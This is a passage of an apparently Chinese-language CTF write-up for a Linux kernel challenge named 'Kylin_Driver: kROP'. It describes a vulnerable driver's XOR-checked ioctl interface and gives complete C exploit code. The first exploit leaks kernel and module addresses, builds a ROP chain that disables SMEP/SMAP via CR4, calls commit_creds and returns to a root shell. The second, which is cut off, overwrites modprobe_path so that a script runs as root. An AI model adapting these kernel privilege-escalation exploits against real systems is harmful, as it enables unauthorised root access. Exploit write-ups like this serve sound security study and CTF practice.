class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Kylin-Driver：kROP"><a href="#Kylin-Driver：kROP" class="headerlink" title="Kylin_Driver：kROP"></a>Kylin_Driver：kROP</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 <span class="token punctuation">\</span>    <span class="token parameter variable">-m</span> 256M <span class="token punctuation">\</span>    <span class="token parameter variable">-kernel</span> bzImage <span class="token punctuation">\</span>    <span class="token parameter variable">-initrd</span> rootfs.cpio <span class="token punctuation">\</span>    <span class="token parameter variable">-monitor</span> /dev/null <span class="token punctuation">\</span>    <span class="token parameter variable">-append</span> <span class="token string">"root=/dev/ram console=ttyS0 loglevel=8 ttyS0,115200 kaslr"</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-cpu</span> kvm64,+smep,+smap <span class="token punctuation">\</span>    <span class="token parameter variable">-netdev</span> user,id<span class="token operator">=</span>t0, <span class="token parameter variable">-device</span> e1000,netdev<span class="token operator">=</span>t0,id<span class="token operator">=</span>nic0 <span class="token punctuation">\</span>    <span class="token parameter variable">-nographic</span> <span class="token punctuation">\</span>    -no-reboot <span class="token punctuation">\</span>    -no-shutdown <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打开了 SMEP、SMAP、KASLR，经测试开了KPTI</p><p>载入了一个LKM，位置在 &#x2F;lib&#x2F;modules&#x2F;5.10.0-9-generic&#x2F;kernel&#x2F;test.ko</p><p>注册了杂项设备结合注册结构体可知设备名称为test，该类设备的应用层接口位于&#x2F;dev目录，并且为该设备注册了处理函数<code>VrQsLpXwNfJrZtBpKjMvWsQpTyLnHrXs</code>。<br><img src="/EXP_FILE/c058402f080a342ea7305b929cc5681b_MD5.jpeg"></p><p><img src="/EXP_FILE/8e0fe6162bb3e5123ef9de3016c2b472_MD5.jpeg"></p><p>首先校验我们传入的buf，要求逐位与0xF9异或之后等于<code>gtwYHamW4U2yQ9LQzfFJSncfHgFf5Pjc</code></p><ul><li>0xDEADBEEF操作码：将驱动模块基址放进kbuf，再将整个kbuf与0xF9异或后放入到 buf + 0x20 处（password后面）</li><li>0xFEEDFACE操作码：将 buf+0x20 再拿出来与0xF9异或后放入kbuf，rsp指向kbuf进行retn<br><img src="/EXP_FILE/13c60f00d2f10013a8a5466b486e0fcb_MD5.jpeg"></li></ul><p>设置 nokaslr 后内核直接卡死了，目前原因不明，只能硬调kaslr了<br><img src="/EXP_FILE/74b280be16995e17cd80a281600b9a79_MD5.jpeg"></p><p>先走常规rop链，我一开始不明白给我们一个LKM基址有什么用，哦原来是LKM里有对cr4操作的gadget，不关SMAP的话commit_cred会crash<br><img src="/EXP_FILE/ddce91073f73e8b83a9f81d9b0681095_MD5.jpeg"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_READ</span> <span class="token expression"><span class="token number">0xDEADBEEF</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_WRITE</span> <span class="token expression"><span class="token number">0xFEEDFACE</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff81090c80</span><span class="token operator">+</span>koff</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RAX_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff8308721f</span><span class="token operator">+</span>koff</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RDI_RAX_RET</span> <span class="token expression"><span class="token number">0x0000000000000009</span><span class="token operator">+</span>lkm</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">RET</span> <span class="token expression"><span class="token number">0x000000000000000c</span><span class="token operator">+</span>lkm</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_CR4_RDI_RET</span> <span class="token expression"><span class="token number">0x000000000000000d</span><span class="token operator">+</span>lkm</span></span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[x] Error: %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token class-name">size_t</span> commit_creds<span class="token operator">=</span><span class="token number">0xffffffff810cf720</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> prepare_kernel_cred<span class="token operator">=</span><span class="token number">0xffffffff810cfbe0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81c00ff0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> init_cred<span class="token operator">=</span><span class="token number">0xffffffff82864660</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/test"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Dev Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> password<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"gtwYHamW4U2yQ9LQzfFJSncfHgFf5Pjc"</span><span class="token punctuation">;</span>password<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token char">'\0'</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x20</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>password<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span> <span class="token operator">*</span>buf <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strncpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> password<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_READ<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>content <span class="token operator">=</span> buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">*</span>content<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">*</span>content<span class="token operator">++</span> <span class="token operator">^=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>content <span class="token operator">=</span> buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">0x20</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"buf[%d]: %lx\n"</span><span class="token punctuation">,</span>j<span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>content<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">size_t</span> leak1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">22</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//kbase</span><span class="token class-name">size_t</span> leak2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//lkm</span><span class="token class-name">size_t</span> koff <span class="token operator">=</span> leak1<span class="token operator">-</span><span class="token number">0x713ec1</span><span class="token operator">-</span><span class="token number">0xffffffff81000000</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> lkm <span class="token operator">=</span> leak2<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] koff = 0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] lkm = 0x%lx\n"</span><span class="token punctuation">,</span> lkm<span class="token punctuation">)</span><span class="token punctuation">;</span>commit_creds<span class="token operator">+=</span>koff<span class="token punctuation">;</span>prepare_kernel_cred<span class="token operator">+=</span>koff<span class="token punctuation">;</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+=</span>koff<span class="token punctuation">;</span>init_cred<span class="token operator">+=</span>koff<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] commit_creds = 0x%lx\n"</span><span class="token punctuation">,</span> commit_creds<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] init_cred = 0x%lx\n"</span><span class="token punctuation">,</span> init_cred<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] swapgs_restore_regs_and_return_to_usermode = 0x%lx\n"</span><span class="token punctuation">,</span> swapgs_restore_regs_and_return_to_usermode<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0x6f0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_CR4_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>init_cred<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>commit_creds<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span><span class="token number">0x36</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>getRootShell<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>ropchain<span class="token operator">+</span>j<span class="token punctuation">)</span> <span class="token operator">^=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_WRITE<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/7bd4daaa0c22cd99f92eeb95360c7069_MD5.jpeg"></p><p>团长的做法是修改 modprobe_path 指向提权脚本，更直接</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_READ</span> <span class="token expression"><span class="token number">0xDEADBEEF</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_WRITE</span> <span class="token expression"><span class="token number">0xFEEDFACE</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff81090c80</span><span class="token operator">+</span>koff</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RSI_RET</span> <span class="token expression"><span class="token number">0xffffffff811cc553</span><span class="token operator">+</span>koff</span></span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[x] Error: %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">modprobe_getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo -e '#!/bin/sh\n/bin/chmod 777 /flag' > /tmp/xx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod +x /tmp/xx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo -e '\\xff\\xff\\xff\\xff' > /tmp/fake"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod +x /tmp/fake"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/tmp/fake"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo [*] modprobe: `cat /proc/sys/kernel/modprobe`"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">size_t</span> modprobe_path<span class="token operator">=</span><span class="token number">0xffffffff82864fc0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81c00ff0</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/test"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Dev Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> password<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"gtwYHamW4U2yQ9LQzfFJSncfHgFf5Pjc"</span><span class="token punctuation">;</span>password<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token char">'\0'</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x20</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>password<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span> <span class="token operator">*</span>buf <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strncpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> password<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_READ<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>content <span class="token operator">=</span> buf<span class="token operator">+</span><span class="token number">0x20</span><span 